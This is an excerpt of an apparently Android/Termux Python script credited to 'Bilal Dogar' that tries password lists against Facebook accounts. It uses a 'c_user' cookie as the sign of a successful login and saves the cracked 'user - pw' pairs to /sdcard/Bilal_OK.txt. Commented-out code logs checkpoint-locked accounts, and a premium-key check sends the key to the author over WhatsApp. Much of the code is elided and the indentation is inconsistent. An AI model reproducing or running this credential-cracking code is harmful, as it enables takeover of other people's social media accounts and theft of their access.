...
def main_apv():
    ...
    if key1 in r1:
        ...
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
        time.sleep(3.5)
        tks = 'Hello%20Sir-Bilal,%20Please%20Confirm%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
        os.system('am start https://wa.me/+923061206565?text=' + tks)
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/Bilal_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				#	wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahn(user))
					#cp.append(wrt)
					#open('/sdcard/Bilal_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
...
\033[1;92m╭──────────────────────────────────────────────────────╮
│\033[1;92m╠══[•]AUTHOR    │ BILAL DOGAR                         │
│──────────────────────────────────────────────────────│
│╠══[•]TEAM  │ DOGAR                            │
│──────────────────────────────────────────────────────│
│╠══[•]INSTAGRAM │ BILAL DOGAR                       │
│──────────────────────────────────────────────────────│
│╠══[•]YOUTUBE   │ BILAL DOGAR                         │
│──────────────────────────────────────────────────────│
│╠══[•]WHATSAPP  │ +923061206565                       │
│──────────────────────────────────────────────────────│
